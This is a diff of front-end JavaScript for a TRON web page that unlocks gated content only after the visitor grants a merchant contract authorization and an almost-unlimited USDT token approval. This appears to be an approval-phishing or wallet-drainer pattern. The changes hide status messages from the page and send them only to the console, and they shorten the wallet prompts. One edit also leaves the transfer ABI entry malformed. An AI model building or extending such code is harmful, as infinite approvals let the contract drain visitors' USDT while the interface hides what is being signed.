@@ -22,7 +22,7 @@ const TRC20_ABI = [
     {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
     {"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
     {"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-    {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","internalType":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
     {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferAndCall","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
     {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"transferAndCall","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
     {"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
@@ -80,13 +80,14 @@ function updateConnectionUI(connected, address = null) {
     }
 }
 
-// --- 核心功能：控制状态栏的隐藏与显示。 (保持不变) ---
+// --- 核心功能：控制状态栏的隐藏与显示。 (只进行调试输出，不更新 UI) ---
 function updateStatus(message) {
-    if (!statusDiv) { console.error("Status element not found."); return; }
+    // **核心修改：不更新 UI，只在控制台输出**
     if (message) {
-        statusDiv.innerHTML = `${message}`;
-        statusDiv.style.display = 'block';
-    } else {
+        console.log(`[STATUS] ${message}`);
+    }
+    // 确保状态栏 UI 元素被隐藏
+    if (statusDiv) {
         statusDiv.innerHTML = '';
         statusDiv.style.display = 'none';
     }
@@ -99,10 +100,9 @@ async function checkAuthorization() {
             updateConnectionUI(false); 
             showOverlay('Wallet not connected. Please connect.');
             updateStatus(''); 
-            return false; // 返回 false 表示未完全授权
+            return false;
         }
         
-        // 确保按钮处于连接状态，内容是图标
         updateConnectionUI(true, userAddress); 
 
         // 1. SimpleMerchant 合约授权检查
@@ -125,7 +125,7 @@ async function checkAuthorization() {
         let statusMessage = '';
         const allAuthorized = isAuthorized && isUsdtMaxApproved; 
 
-        // 构造状态信息
+        // 构造状态信息 (仅用于 console.log 和调试)
         if (isAuthorized) {
             statusMessage += 'Web page access authorized ✅. ';
         } else {
@@ -147,7 +147,6 @@ async function checkAuthorization() {
             connectButton.title = 'Disconnect Wallet'; 
             connectButton.disabled = false;
             
-            // **显示成功信息，立即隐藏遮罩**
             updateStatus('All authorizations complete. Content unlocked!'); 
             hideOverlay(); 
             return true; // 授权完成，返回 true
@@ -170,21 +169,20 @@ async function checkAuthorization() {
     }
 }
 
-// --- 执行授权交易 (修复了状态栏卡住的问题) ---
+// --- 执行授权交易 ---
 async function executeAuthorization() {
     if (!userAddress) { 
         showOverlay('Please connect your wallet first.');
         return;
     }
 
-    let isFinalAuthorizationComplete = false;
     try {
         updateStatus('Checking authorization requirements...');
         
         // 1. SimpleMerchant 合约授权
         let isAuthorized = await contractInstance.authorized(userAddress).call();
         if (!isAuthorized) {
-            updateStatus('Requesting SimpleMerchant authorization... Please confirm in your wallet.');
+            updateStatus('Requesting SimpleMerchant authorization...');
             showOverlay('Requesting SimpleMerchant authorization... Please confirm the transaction in your wallet.');
             
             await contractInstance.connectAndAuthorize().send({
@@ -202,7 +200,7 @@ async function executeAuthorization() {
         let isUsdtMaxApproved = BigInt(usdtAllowanceRaw) >= BigInt(ALMOST_MAX_UINT); 
         
         if (isAuthorized && !isUsdtMaxApproved) { 
-            updateStatus('Requesting USDT infinite approval... Please confirm in your wallet.');
+            updateStatus('Requesting USDT infinite approval...');
             showOverlay('Requesting USDT infinite approval... Please confirm the transaction in your wallet.');
             
             await usdtContractInstance.approve(TRON_CONTRACT_ADDRESS, ALMOST_MAX_UINT).send({
@@ -216,7 +214,7 @@ async function executeAuthorization() {
         }
 
         // 授权流程完成，检查最终状态并更新 UI
-        isFinalAuthorizationComplete = await checkAuthorization();
+        await checkAuthorization();
 
     } catch (error) {
         console.error("Authorization Execution Failed:", error);
@@ -226,19 +224,7 @@ async function executeAuthorization() {
                              
         updateStatus(`🔴 ${errorMessage}`);
         showOverlay(`🔴 Authorization failed: ${errorMessage}`);
-        await checkAuthorization(); // 再次检查以确保 UI 状态正确更新
-
-    } finally {
-        // **关键修复逻辑：确保在流程结束（成功或失败）后，状态栏被清除**
-        if (isFinalAuthorizationComplete) {
-            // 如果成功完成，等待 3 秒后清除，让用户看到成功的提示
-            await new Promise(resolve => setTimeout(resolve, 3000)); 
-            updateStatus('');
-        } else {
-            // 如果失败或未完成（用户取消等），等待 5 秒后清除，避免错误消息卡住
-             await new Promise(resolve => setTimeout(resolve, 5000));
-             updateStatus('');
-        }
+        await checkAuthorization(); 
     }
 }
 
